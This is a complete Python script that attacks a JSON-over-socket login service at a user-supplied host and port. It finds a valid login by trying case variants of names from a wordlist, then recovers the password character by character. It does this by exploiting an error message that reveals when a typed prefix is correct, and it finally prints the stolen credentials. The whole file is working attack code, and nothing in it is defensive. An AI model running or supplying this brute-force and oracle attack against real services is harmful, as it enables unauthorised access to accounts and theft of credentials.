import argparse, itertools, json, string
from socket import socket

parser = argparse.ArgumentParser()
parser.add_argument("hostname", type=str, help="enter IP address")
parser.add_argument("port", type=int, help="enter port")
args = parser.parse_args()

def pass_logger_generator():
    for i in itertools.product(string.ascii_letters + string.digits, repeat=1):
        yield "".join(i)

def admin_login_generator(line):
    for i in map(''.join, itertools.product(*zip(line.upper(), line.lower()))):
        yield i

logger = {}
flag = False

def password_guess(correct_login):
    password = ""
    while True:
        for k in pass_logger_generator():
            password += k
            client.send(json.dumps({"login":login, "password": password}).encode(encoding='utf-8'))
            response = client.recv(1024)
            response = response.decode(encoding='utf-8')
            if response == json.dumps({"result": "Exception happened during login"}):
                continue
            elif response == json.dumps({"result": "Wrong password!"}):
                password = password[:-1]
                continue
            elif response == json.dumps({"result": "Connection success!"}):
                return password

with socket() as client:
    client.connect((args.hostname, args.port))
    answer = ()
    login = ""
    with open('logins.txt', 'r', encoding='utf-8') as f:
        for line in f:
            if flag:
                break
            line = line.strip("\n")
            for j in admin_login_generator(line):
                logger["login"] = j
                logger["password"] = ' '
                client.send(json.dumps(logger).encode())
                response = client.recv(1024).decode()
                answer = json.loads(response)
                if answer["result"] == "Wrong password!":
                    login = j
                    flag = True
                    break
    pomogite = password_guess(login)
    print(json.dumps({"login": login, "password": pomogite}))